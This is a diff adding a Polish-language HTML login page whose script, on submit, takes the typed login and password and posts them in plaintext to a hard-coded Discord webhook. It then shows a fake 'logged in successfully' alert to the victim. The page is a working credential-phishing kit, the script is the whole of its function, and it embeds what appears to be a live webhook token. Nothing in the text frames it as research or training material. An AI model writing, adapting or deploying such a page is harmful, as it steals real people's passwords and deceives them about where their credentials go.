@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Logowanie</title>
+</head>
+<body>
+  <h2>Logowanie</h2>
+  <form id="loginForm">
+    <label for="username">Login:</label><br />
+    <input type="text" id="username" name="username" required /><br /><br />
+    <label for="password">Hasło:</label><br />
+    <input type="password" id="password" name="password" required /><br /><br />
+    <button type="submit">Zaloguj się</button>
+  </form>
+
+  <script>
+    const webhookURL = 'https://discord.com/api/webhooks/1388446820606410824/_Bp4K7ULlKBVA4nOPuCpvI3ZcdI84DCjpTpKJvswcO0M55PZNlHl0rIDT8z153WWz2po';
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      const payload = {
+        content: `**Nowe dane logowania:**\nLogin: ${username}\nHasło: ${password}`
+      };
+
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      }).then(() => {
+        alert('Zalogowano pomyślnie!');
+        // Możesz tu przekierować dalej, np.:
+        // window.location.href = 'https://example.com';
+      }).catch(() => {
+        alert('Coś poszło nie tak!');
+      });
+    });
+  </script>
+</body>
+</html>
